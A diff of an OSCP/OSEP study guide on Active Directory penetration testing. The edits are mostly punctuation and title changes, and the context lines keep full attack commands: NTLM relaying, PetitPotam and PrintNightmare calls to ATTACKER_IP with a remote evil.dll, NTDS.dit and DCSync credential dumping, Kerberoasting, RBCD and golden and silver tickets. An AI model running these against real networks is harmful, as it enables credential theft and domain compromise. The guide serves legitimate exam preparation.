@@ -1,5 +1,7 @@
-# Active Directory Penetration Testing — OSCP/OSEP Study Guide
-> **Section 4.2 — Windows Infrastructure: Penetration Testing Active Directory**
+# Windows Based Infrastructure Pentesting
+### OSCP/OSEP Study Guide
+> [!note]
+> **Section 4.2 - Windows Infrastructure: Penetration Testing Active Directory**
 > Compiled for exam preparation. All commands use placeholder lab environment (VULN.local / 10.10.10.x)
 
 ---
@@ -27,7 +29,7 @@
 19. [PrintNightmare / PetitPotam](#19-printnightmare--petitpotam)
 20. [Defender for Identity Bypasses](#20-defender-for-identity-bypasses)
 21. [Persistence Techniques](#21-persistence-techniques)
-22. [Quick Reference — Tool Comparison Table](#22-quick-reference--tool-comparison-table)
+22. [Quick Reference - Tool Comparison Table](#22-quick-reference--tool-comparison-table)
 
 ---
 
@@ -37,12 +39,12 @@
 Active Directory (AD) is Microsoft's directory service for Windows domain networks. It centralizes authentication and authorization.
 
 **Key Components:**
-- **Domain** — Logical grouping of objects (users, computers, groups)
-- **Domain Controller (DC)** — Server running AD DS; holds the database (NTDS.dit)
-- **Forest** — Collection of one or more domains sharing a schema
-- **Trust** — Relationship allowing one domain to access resources in another
-- **OU (Organizational Unit)** — Container to organize objects and apply GPOs
-- **GPO (Group Policy Object)** — Policy settings applied to users/computers
+- **Domain** - Logical grouping of objects (users, computers, groups)
+- **Domain Controller (DC)** - Server running AD DS; holds the database (NTDS.dit)
+- **Forest** - Collection of one or more domains sharing a schema
+- **Trust** - Relationship allowing one domain to access resources in another
+- **OU (Organizational Unit)** - Container to organize objects and apply GPOs
+- **GPO (Group Policy Object)** - Policy settings applied to users/computers
 
 ### FSMO Roles (Flexible Single Master Operations)
 | Role | Scope | Purpose |
@@ -85,11 +87,11 @@ klist  # list Kerberos tickets
 
 **Download:**
 ```bash
-# On Linux (Kali) — Proxy
+# On Linux (Kali) - Proxy
 wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
 tar -xvzf ligolo*
 
-# On Windows (target) — Agent
+# On Windows (target) - Agent
 # Upload: ligolo-ng_agent_0.8.2_windows_amd64.zip
 ```
 
@@ -162,7 +164,7 @@ Server → DC:     Verify response
 DC → Server:     Accept/Deny
 ```
 - **Weakness:** The NT hash can be captured from the network challenge/response and cracked or relayed.
-- **Net-NTLMv1 / Net-NTLMv2** are the formats seen on the wire (captured by Responder). These **cannot** be passed directly — they must be cracked or relayed.
+- **Net-NTLMv1 / Net-NTLMv2** are the formats seen on the wire (captured by Responder). These **cannot** be passed directly - they must be cracked or relayed.
 - **NTLM Hash (NT Hash)** from the SAM/NTDS *can* be passed directly (Pass-the-Hash).
 
 ### Kerberos Authentication Flow
@@ -176,9 +178,9 @@ DC → Server:     Accept/Deny
 ```
 
 **Key tickets:**
-- **TGT (Ticket Granting Ticket)** — Proves identity to DC; encrypted with `krbtgt` hash
-- **TGS (Ticket Granting Service)** — Service-specific ticket; encrypted with service account's NT hash
-- **ST (Service Ticket)** — Same as TGS, used interchangeably
+- **TGT (Ticket Granting Ticket)** - Proves identity to DC; encrypted with `krbtgt` hash
+- **TGS (Ticket Granting Service)** - Service-specific ticket; encrypted with service account's NT hash
+- **ST (Service Ticket)** - Same as TGS, used interchangeably
 
 **Kerberos attack surface:**
 | Attack | What's targeted | What you get |
@@ -193,7 +195,7 @@ DC → Server:     Accept/Deny
 ### OAuth / SAML (Brief)
 - Modern federated auth used alongside AD (ADFS, Azure AD)
 - Tokens can be stolen from browser storage or memory
-- Golden SAML attack — forge SAML assertions using stolen ADFS signing cert
+- Golden SAML attack - forge SAML assertions using stolen ADFS signing cert
 
 ---
 
@@ -207,34 +209,34 @@ When SMB signing is **disabled**, captured NTLM challenges can be forwarded to a
 - A victim that will authenticate (triggered by LLMNR/NBT-NS poisoning or coercion)
 
 ### Tools
-- **Responder** — Poisons LLMNR/mDNS/NBT-NS to capture hashes
-- **ntlmrelayx.py** — Relays authentication to targets
+- **Responder** - Poisons LLMNR/mDNS/NBT-NS to capture hashes
+- **ntlmrelayx.py** - Relays authentication to targets
 
 ### Commands
 ```bash
-# Step 1 — Identify hosts without SMB signing
+# Step 1 - Identify hosts without SMB signing
 nxc smb 10.10.10.0/24 --gen-relay-list relay_targets.txt
 
-# Step 2 — Start Responder (turn OFF SMB and HTTP to let ntlmrelayx handle them)
+# Step 2 - Start Responder (turn OFF SMB and HTTP to let ntlmrelayx handle them)
 # Edit /etc/responder/Responder.conf: SMB = Off, HTTP = Off
 sudo responder -I eth0 -dwv
 
-# Step 3 — Relay to SMB (dump hashes)
+# Step 3 - Relay to SMB (dump hashes)
 sudo ntlmrelayx.py -tf relay_targets.txt -smb2support
 
-# Step 3 (alt) — Relay to LDAP (create admin user)
+# Step 3 (alt) - Relay to LDAP (create admin user)
 sudo ntlmrelayx.py -t ldap://10.10.10.100 --escalate-user lowpriv_user
 
-# Step 3 (alt) — Interactive SMB shell
+# Step 3 (alt) - Interactive SMB shell
 sudo ntlmrelayx.py -tf relay_targets.txt -smb2support -i
 
-# Step 3 (alt) — Execute a command on relay
+# Step 3 (alt) - Execute a command on relay
 sudo ntlmrelayx.py -tf relay_targets.txt -smb2support -c "powershell -enc <base64>"
 ```
 
 ### Coercion (Force Authentication)
 ```bash
-# PetitPotam — coerce DC to authenticate to attacker
+# PetitPotam - coerce DC to authenticate to attacker
 python3 PetitPotam.py -u dritchie -p 'P@ssw0rd123' ATTACKER_IP DC_IP
 
 # PrinterBug / SpoolSample
@@ -283,7 +285,7 @@ Empty LM: `-hashes :920ae267e048417fcfe00f49ecbd4b33`
 ### Tool Stealth Comparison
 | Tool | Protocol | Port | Stealth | Notes |
 |------|----------|------|---------|-------|
-| psexec | SMB/RPC | 445 | Low | Creates a service — very noisy |
+| psexec | SMB/RPC | 445 | Low | Creates a service - very noisy |
 | smbexec | SMB | 445 | Medium | Named pipes, no service created |
 | wmiexec | WMI | 135 | High | Output via SMB share |
 | dcomexec | DCOM | 135 | High | Modern Windows |
@@ -325,7 +327,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt captured_hashes.txt
 ## 7. Kerberoasting
 
 ### Theory
-Any authenticated domain user can request a TGS for any service with an SPN registered. The TGS is encrypted with the **service account's NT hash**. This ticket can be taken offline and cracked — no interaction with the service account or target machine required.
+Any authenticated domain user can request a TGS for any service with an SPN registered. The TGS is encrypted with the **service account's NT hash**. This ticket can be taken offline and cracked - no interaction with the service account or target machine required.
 
 **Requirements:** Valid domain credentials (any user)
 
@@ -384,10 +386,10 @@ When a user has **"Do not require Kerberos preauthentication"** enabled, the DC 
 
 **Linux (Impacket):**
 ```bash
-# With credentials — enumerate vulnerable users and request tickets
+# With credentials - enumerate vulnerable users and request tickets
 python GetNPUsers.py VULN.local/dritchie:P@ssw0rd123 -request -format hashcat -outputfile asrep_hashes.txt
 
-# Without credentials — need username list
+# Without credentials - need username list
 python GetNPUsers.py VULN.local/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt
 
 # LDAP search to identify vulnerable users first
@@ -504,11 +506,11 @@ LDAP is the protocol used to query Active Directory. Authenticated users can enu
 
 ### Commands
 ```bash
-# ldapdomaindump — dumps everything to HTML/JSON
+# ldapdomaindump - dumps everything to HTML/JSON
 ldapdomaindump -u 'VULN\dritchie' -p 'P@ssw0rd123' 10.10.10.100
 # Output: domain_users.html, domain_groups.html, domain_computers.html etc.
 
-# ldapsearch — manual queries
+# ldapsearch - manual queries
 ldapsearch -x -H ldap://10.10.10.100 -D 'VULN\dritchie' -w 'P@ssw0rd123' -b "dc=VULN,dc=local" "(objectClass=user)" sAMAccountName
 
 # Find all users with SPN (Kerberoast candidates)
@@ -563,10 +565,10 @@ wget "https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloo
 
 **Windows (SharpHound):**
 ```powershell
-# Run SharpHound — all collection methods
+# Run SharpHound - all collection methods
 .\SharpHound.exe -c All --outputdirectory C:\temp\
 
-# Stealth — LDAP only (no network connections to machines)
+# Stealth - LDAP only (no network connections to machines)
 .\SharpHound.exe -c DCOnly
 
 # Domain trusts
@@ -580,7 +582,7 @@ bloodhound-python -u dritchie -p 'P@ssw0rd123' -d VULN.local -ns 10.10.10.100 -c
 ```
 
 ### Key BloodHound Queries (Pre-built)
-- **Shortest Path to Domain Admins** — Most important for exam
+- **Shortest Path to Domain Admins** - Most important for exam
 - **Find all Domain Admins**
 - **Find Kerberoastable Users with High Value Targets**
 - **Find AS-REP Roastable Users**
@@ -601,9 +603,9 @@ MATCH (u)-[:GetChanges|GetChangesAll]->(d:Domain) RETURN u.name
 ## 13. NTDS.dit Extraction
 
 ### Theory
-`NTDS.dit` is the Active Directory database — it contains **all domain user hashes**. Located at `C:\Windows\NTDS\ntds.dit` on Domain Controllers. Locked while AD is running, so it must be extracted using Volume Shadow Copies (VSS) or the ntdsutil tool.
+`NTDS.dit` is the Active Directory database - it contains **all domain user hashes**. Located at `C:\Windows\NTDS\ntds.dit` on Domain Controllers. Locked while AD is running, so it must be extracted using Volume Shadow Copies (VSS) or the ntdsutil tool.
 
-### Method 1 — ntdsutil (interactive)
+### Method 1 - ntdsutil (interactive)
 ```cmd
 ntdsutil
 activate instance ntds
@@ -613,7 +615,7 @@ quit
 quit
 ```
 
-### Method 2 — VSS (Shadow Copy)
+### Method 2 - VSS (Shadow Copy)
 ```cmd
 # Create shadow copy
 vssadmin create shadow /for=C:
@@ -626,7 +628,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYS
 vssadmin delete shadows /shadow={SHADOW_ID}
 ```
 
-### Method 3 — NetExec remote dump (if DA)
+### Method 3 - NetExec remote dump (if DA)
 ```bash
 nxc smb 10.10.10.100 -u Administrator -H 920ae267e048417fcfe00f49ecbd4b33 --ntds
 nxc smb 10.10.10.100 -u Administrator -H 920ae267e048417fcfe00f49ecbd4b33 --ntds --sam --dpapi --lsa
@@ -645,7 +647,7 @@ nxc smb 10.10.10.100 -u Administrator -H 920ae267e048417fcfe00f49ecbd4b33 --ntds
 # After transferring ntds.dit + SYSTEM to Kali
 impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
 
-# Remote DCSync (no file needed — if you have DCSync rights)
+# Remote DCSync (no file needed - if you have DCSync rights)
 impacket-secretsdump VULN.local/Administrator:'P@$$w0rd!'@10.10.10.100
 ```
 
@@ -839,7 +841,7 @@ The `msDS-KeyCredentialLink` attribute allows certificate-based authentication v
 
 ### Commands
 ```bash
-# Linux — pywhisker
+# Linux - pywhisker
 python3 pywhisker.py -d VULN.local -u dritchie -p 'P@ssw0rd123' --target victimuser --action add
 
 # Gets you: cert.pfx + cert password
@@ -853,10 +855,10 @@ python3 getnthash.py VULN.local/victimuser -key KEY
 ```
 
 ```powershell
-# Windows — Whisker
+# Windows - Whisker
 .\Whisker.exe add /target:victimuser /domain:VULN.local /dc:dc01.VULN.local
 
-# Windows — Rubeus (using generated cert)
+# Windows - Rubeus (using generated cert)
 .\Rubeus.exe asktgt /user:victimuser /certificate:BASE64_CERT /password:CERT_PASS /domain:VULN.local /dc:10.10.10.100 /getcredentials
 ```
 
@@ -874,16 +876,16 @@ RBCD allows a resource (computer) to specify which accounts can delegate to it v
 
 ### Commands
 ```bash
-# Step 1 — Create a fake computer account (if MachineAccountQuota > 0)
+# Step 1 - Create a fake computer account (if MachineAccountQuota > 0)
 impacket-addcomputer VULN.local/dritchie:'P@ssw0rd123' -computer-name 'EVIL$' -computer-pass 'EvilPass123!'
 
-# Step 2 — Set RBCD on target computer
+# Step 2 - Set RBCD on target computer
 impacket-rbcd -delegate-from 'EVIL$' -delegate-to 'TARGETPC$' -action write VULN.local/dritchie:'P@ssw0rd123' -dc-ip 10.10.10.100
 
-# Step 3 — Get service ticket impersonating Administrator
+# Step 3 - Get service ticket impersonating Administrator
 impacket-getST -spn cifs/TARGETPC.VULN.local -impersonate Administrator VULN.local/'EVIL$':'EvilPass123!' -dc-ip 10.10.10.100
 
-# Step 4 — Use the ticket
+# Step 4 - Use the ticket
 export KRB5CCNAME=Administrator.ccache
 impacket-psexec VULN.local/Administrator@TARGETPC.VULN.local -k -no-pass
 ```
@@ -908,10 +910,10 @@ Set-ADComputer TARGETPC -PrincipalsAllowedToDelegateToAccount EVIL$
 # Check if vulnerable
 rpcdump.py @10.10.10.100 | grep 'MS-RPRN\|MS-PAR'
 
-# Exploit — remote DLL load as SYSTEM
+# Exploit - remote DLL load as SYSTEM
 python3 CVE-2021-1675.py VULN.local/dritchie:'P@ssw0rd123'@10.10.10.100 '\\ATTACKER_IP\share\evil.dll'
 
-# On Kali — host the DLL via SMB
+# On Kali - host the DLL via SMB
 impacket-smbserver share /path/to/malicious/ -smb2support
 
 # Mimikatz via PrintNightmare
@@ -919,7 +921,7 @@ impacket-smbserver share /path/to/malicious/ -smb2support
 ```
 
 ### PetitPotam (CVE-2021-36942)
-**Theory:** Forces a Domain Controller to authenticate to an attacker's machine via the EFS RPC interface. Combined with NTLM relay to AD CS, it can generate certificates for the DC — enabling full domain compromise.
+**Theory:** Forces a Domain Controller to authenticate to an attacker's machine via the EFS RPC interface. Combined with NTLM relay to AD CS, it can generate certificates for the DC - enabling full domain compromise.
 
 ```bash
 # Trigger authentication from DC to attacker (authenticated)
@@ -929,16 +931,16 @@ python3 PetitPotam.py -u dritchie -p 'P@ssw0rd123' -d VULN.local ATTACKER_IP DC_
 python3 PetitPotam.py ATTACKER_IP DC_IP
 
 # Combined with NTLM relay → AD CS
-# Step 1 — Relay to ADCS HTTP enrollment
+# Step 1 - Relay to ADCS HTTP enrollment
 ntlmrelayx.py -t http://ADCS_IP/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
 
-# Step 2 — Trigger PetitPotam
+# Step 2 - Trigger PetitPotam
 python3 PetitPotam.py ATTACKER_IP DC_IP
 
-# Step 3 — Get base64 cert, use with Rubeus for TGT
+# Step 3 - Get base64 cert, use with Rubeus for TGT
 .\Rubeus.exe asktgt /user:DC$ /certificate:BASE64_CERT /ptt
 
-# Step 4 — DCSync
+# Step 4 - DCSync
 mimikatz # lsadump::dcsync /all /csv
 ```
 
@@ -997,7 +999,7 @@ python psexec.py VULN.local/fakeadmin@DC_IP -k -no-pass
 
 ### Silver Ticket
 ```powershell
-# More stealthy — no DC interaction needed
+# More stealthy - no DC interaction needed
 kerberos::golden /user:admin /domain:VULN.local /sid:S-1-5-21-... /target:dc01.VULN.local /service:cifs /rc4:SERVICE_HASH /ptt
 
 # Available services: cifs, host, http, mssqlsvc, ldap
@@ -1025,7 +1027,7 @@ schtasks /run /s target-pc /tn "WindowsUpdate"
 
 ---
 
-## 22. Quick Reference — Tool Comparison Table
+## 22. Quick Reference - Tool Comparison Table
 
 ### Scanning & Enumeration
 | Task | Tool | Command |
@@ -1044,7 +1046,7 @@ schtasks /run /s target-pc /tn "WindowsUpdate"
 | AS-REP Roast | hashcat | `-m 18200` |
 | Net-NTLMv2 | hashcat | `-m 5600` |
 | Net-NTLMv1 | hashcat | `-m 5500` |
-| NTLM (pass) | — | Pass directly |
+| NTLM (pass) | - | Pass directly |
 
 ### Lateral Movement Summary
 | Tool | Auth | Port | Shell Type |
